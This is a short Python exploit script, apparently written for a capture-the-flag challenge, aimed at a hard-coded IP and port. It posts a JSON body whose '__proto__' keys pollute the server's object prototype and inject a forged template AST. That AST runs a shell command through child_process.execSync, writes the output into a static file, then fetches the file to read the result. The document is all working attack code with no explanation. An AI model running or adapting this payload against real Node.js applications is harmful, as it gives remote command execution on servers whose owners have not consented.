#!/usr/bin/python3

import requests
import json

def connect():
    url = "http://167.71.131.167:30898/"
    submit = "api/submit"
    out = "static/out"

    headers = { 
        'Content-Type' : 'application/json', 
        'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:92.0) Gecko/20100101 Firefox/92.0',
        }

    data = {        
        "artist.name":"Gingell",
        "__proto__.type": "Program",
        "__proto__.body": [{
            "type": "MustacheStatement",
            "path": 0,
            "params": [{
                "type": "NumberLiteral",
                "value": "process.mainModule.require('child_process').execSync(`whoami > /app/static/out`)"
            }],
            "loc": {
                "start": 0,
                "end": 0
            }
        }]
        }

    r = requests.post(url + submit, json=data, headers=headers)
    r2 = requests.get(url + out)

    print(r.status_code)
    print(r.text)
    print(r2.text)
    

if __name__ == '__main__':
    connect()